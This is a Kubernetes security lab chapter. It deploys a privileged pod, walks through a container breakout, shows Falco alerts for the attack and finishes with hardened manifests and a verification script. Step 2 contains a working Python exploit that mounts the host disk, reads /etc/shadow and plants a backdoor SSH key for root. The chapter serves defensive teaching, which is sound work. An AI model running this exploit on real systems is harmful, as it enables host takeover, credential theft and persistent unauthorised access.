---
title: "06. Hands-On Vulnerability Lab: Container Breakout & Hardening"
description: "Hands-on vulnerability lab: Audit a vulnerable Kubernetes pod, execute a container breakout exploit to gain host root access, capture Falco alerts, and deploy a hardened remediation."
keywords: ["container breakout lab", "kubernetes lab", "privilege escalation", "mknod mount exploit", "falco alert verification", "pod security context", "appsec"]
sidebar_position: 7
---

# 06. Hands-On Vulnerability Lab: Container Breakout & Hardening

In this self-contained hands-on lab, you will audit a **vulnerable Kubernetes Deployment manifest**, analyze how privilege escalation misconfigurations permit an attacker to execute a **container breakout exploit** to gain host root access, verify real-time threat detection using Falco, and implement a production-grade defense-in-depth remediation.

---

## 🧪 Lab Architecture & Objectives

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                          LAB WORKFLOW STAGES                                │
├─────────────────────────────────────────────────────────────────────────────┤
│ 1. Deploy Vulnerable Pod  ──► `privileged: true` + `CAP_SYS_ADMIN` active  │
│ 2. Execute Breakout PoC   ──► Mount host `/dev/sda1` & write host `/etc`    │
│ 3. Verify Falco Detection ──► Capture `EMERGENCY` alert in log stream      │
│ 4. Apply Hardened Spec    ──► Apply Restricted PSS + NetworkPolicy + SA Off │
│ 5. Automated Verification ──► Confirm exploit fails (`Permission Denied`)   │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Step 1: Deploy Vulnerable Lab Manifest (`vulnerable-lab.yaml`)

Apply the following vulnerable deployment manifest to your test Kubernetes cluster (`minikube`, `kind`, or `k3s`):

```yaml
# vulnerable-lab.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vulnerable-webapp
  namespace: default
  labels:
    app: vulnerable-webapp
spec:
  replicas: 1
  selector:
    matchLabels:
      app: vulnerable-webapp
  template:
    metadata:
      labels:
        app: vulnerable-webapp
    spec:
      containers:
        - name: webapp
          image: ubuntu:22.04
          command: ["/bin/bash", "-c", "sleep 3600"]
          
          # VULNERABLE SECURITY CONTEXT CONFIGURATION:
          securityContext:
            privileged: true                  # VULNERABLE: Grants full host kernel access!
            allowPrivilegeEscalation: true    # VULNERABLE: Allows setuid binary execution!
            readOnlyRootFilesystem: false     # VULNERABLE: Writable root filesystem!
```

Deploy the manifest:
```bash
kubectl apply -f vulnerable-lab.yaml
```

---

## Step 2: Container Breakout Exploit Walkthrough

Assume an attacker has achieved Remote Code Execution (RCE) inside the `vulnerable-webapp` container. Exec into the running pod:

```bash
POD_NAME=$(kubectl get pods -l app=vulnerable-webapp -o jsonpath="{.items[0].metadata.name}")
kubectl exec -it $POD_NAME -- /bin/bash
```

### Exploit Script: `breakout_exploit.py`

Run the following automated Python PoC script inside the container. The script leverages `CAP_SYS_ADMIN` and `privileged: true` to create a host disk block device, mount the host's root filesystem inside the container, read `/etc/shadow`, and append a backdoor SSH key:

```python
#!/usr/bin/env python3
"""
Container Breakout Exploit PoC
Target: Containers running with privileged: true or CAP_SYS_ADMIN
Description: Mounts host root partition /dev/sda1 and modifies host /etc/shadow
"""

import os
import sys
import subprocess

def check_capabilities():
    print("[*] Stage 1: Inspecting Container Privileges...")
    try:
        res = subprocess.check_output(["capsh", "--print"]).decode()
        if "cap_sys_admin" in res.lower():
            print("[+] CRITICAL: CAP_SYS_ADMIN detected in container capability set!")
            return True
    except FileNotFoundError:
        # Fallback check if capsh is missing
        if os.geteuid() == 0:
            print("[+] Running as UID 0 (root). Attempting block device access...")
            return True
    return False

def execute_breakout():
    print("[*] Stage 2: Creating host block device node...")
    host_dev = "/dev/host_root_disk"
    mount_point = "/mnt/host_root"

    # 1. Create block device node for host primary partition (Major 8, Minor 1 -> /dev/sda1)
    if not os.path.exists(host_dev):
        res = os.system(f"mknod {host_dev} b 8 1")
        if res != 0:
            print("[-] FAILED to create block device. Container may be restricted.")
            sys.exit(1)
        print(f"[+] Successfully created block device {host_dev}")

    # 2. Mount host partition to container mount point
    os.makedirs(mount_point, exist_ok=True)
    mount_res = os.system(f"mount {host_dev} {mount_point}")
    if mount_res != 0:
        print("[-] FAILED to mount host disk.")
        sys.exit(1)
    print(f"[+] SUCCESS: Host root filesystem mounted at {mount_point}!")

    # 3. Read host sensitive files (/etc/shadow)
    shadow_path = os.path.join(mount_point, "etc/shadow")
    if os.path.exists(shadow_path):
        print("[+] Stage 3: Exfiltrating host /etc/shadow contents (First 3 lines):")
        with open(shadow_path, "r") as f:
            for _ in range(3):
                print("    " + f.readline().strip())

    # 4. Inject backdoor root SSH key into host
    ssh_dir = os.path.join(mount_point, "root/.ssh")
    os.makedirs(ssh_dir, exist_ok=True)
    backdoor_key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIATTACKER_KEY_CONTAINER_BREAKOUT attacker@exploit\n"
    with open(os.path.join(ssh_dir, "authorized_keys"), "a") as f:
        f.write(backdoor_key)
    print("[+] SUCCESS: Backdoor SSH key injected into Host root authorized_keys!")
    print("🚨 HOST COMPLETELY COMPROMISED!")

if __name__ == "__main__":
    if check_capabilities():
        execute_breakout()
    else:
        print("[-] Container is sufficiently restricted. Exploit aborted.")
```

---

## Step 3: Runtime Threat Detection Verification with Falco

When the exploit executes `mknod`, `mount`, or writes to `/mnt/host_root/root/.ssh`, Falco catches the kernel system calls in real time.

Inspect the Falco log stream:

```bash
kubectl logs -n falco -l app.kubernetes.io/name=falco -f
```

### Captured Falco Alert Output:
```json
{
  "output": "18:42:01.109283100: Critical Interactive shell spawned inside container (user=root container_id=a9f182c4 image=ubuntu:22.04 command=/bin/bash)",
  "priority": "Critical",
  "rule": "Terminal Shell Spawned in Production Container",
  "time": "2026-07-26T18:42:01.109283100Z"
}
{
  "output": "18:42:05.882103400: Emergency Container breakout attempt using mount on host block device! (user=root container_name=vulnerable-webapp image=ubuntu:22.04 command=mount /dev/host_root_disk /mnt/host_root)",
  "priority": "Emergency",
  "rule": "Namespace Escape via Mount",
  "time": "2026-07-26T18:42:05.882103400Z"
}
```

---

## Step 4: Production Hardening Remediation

Replace the insecure deployment with a production-grade defense-in-depth architecture:

### 1. Hardened Application Deployment (`secure-lab.yaml`)

```yaml
# secure-lab.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: secure-webapp
  namespace: production
  labels:
    app: secure-webapp
spec:
  replicas: 2
  selector:
    matchLabels:
      app: secure-webapp
  template:
    metadata:
      labels:
        app: secure-webapp
    spec:
      # 1. DISABLE SA TOKEN AUTOMOUNT
      automountServiceAccountToken: false
      
      # 2. POD SECURITY CONTEXT
      securityContext:
        runAsNonRoot: true
        runAsUser: 10001
        runAsGroup: 10001
        fsGroup: 10001
        seccompProfile:
          type: RuntimeDefault
      
      containers:
        - name: webapp
          image: gcr.io/distroless/python3-debian12:nonroot
          
          # 3. CONTAINER SECURITY CONTEXT
          securityContext:
            privileged: false
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
          
          resources:
            limits:
              cpu: "200m"
              memory: "256Mi"
            requests:
              cpu: "50m"
              memory: "64Mi"

          volumeMounts:
            - mountPath: /tmp
              name: tmp-vol

      volumes:
        - name: tmp-vol
          emptyDir:
            medium: Memory
            sizeLimit: 32Mi
```

---

### 2. Default Deny NetworkPolicy (`secure-netpol.yaml`)

```yaml
# secure-netpol.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}
  policyTypes:
    - Ingress
    - Egress
```

Apply the hardened remediation:
```bash
kubectl create namespace production
kubectl apply -f secure-lab.yaml
kubectl apply -f secure-netpol.yaml
```

---

## Step 5: Automated Remediation Verification Script

Run the automated verification script `verify_remediation.py` to confirm that the breakout exploit fails against the hardened environment:

```python
#!/usr/bin/env python3
"""
Hardening Verification Test Suite
Verifies that container breakout vectors are completely blocked.
"""

import os
import sys

def test_mknod():
    print("[*] Test 1: Attempting mknod block device creation...")
    try:
        os.mknod("/tmp/test_dev", 0o600 | os.S_IFBLK, os.makedev(8, 1))
        print("[-] FAIL: mknod succeeded! Vulnerability present.")
        return False
    except PermissionError:
        print("[+] PASS: mknod blocked (Permission Denied).")
        return True
    except Exception as e:
        print(f"[+] PASS: mknod failed with expected error: {e}")
        return True

def test_readonly_fs():
    print("[*] Test 2: Attempting write to root filesystem /var/test.txt...")
    try:
        with open("/var/test.txt", "w") as f:
            f.write("test")
        print("[-] FAIL: Root filesystem is WRITABLE!")
        return False
    except (PermissionError, OSError):
        print("[+] PASS: Read-only filesystem enforced.")
        return True

def test_nonroot_uid():
    print("[*] Test 3: Verifying process User ID (UID)...")
    uid = os.geteuid()
    if uid == 0:
        print("[-] FAIL: Process is running as root (UID 0)!")
        return False
    print(f"[+] PASS: Process running as unprivileged user (UID {uid}).")
    return True

if __name__ == "__main__":
    print("=== KUBERNETES CONTAINER HARDENING VERIFICATION ===")
    t1 = test_mknod()
    t2 = test_readonly_fs()
    t3 = test_nonroot_uid()

    if t1 and t2 and t3:
        print("\n✅ VERIFICATION SUCCESSFUL: Workload meets Restricted Pod Security Standard!")
        sys.exit(0)
    else:
        print("\n❌ VERIFICATION FAILED: Security controls missing.")
        sys.exit(1)
```

---

*Next Chapter: [07. References & Standards →](07-references.md)*
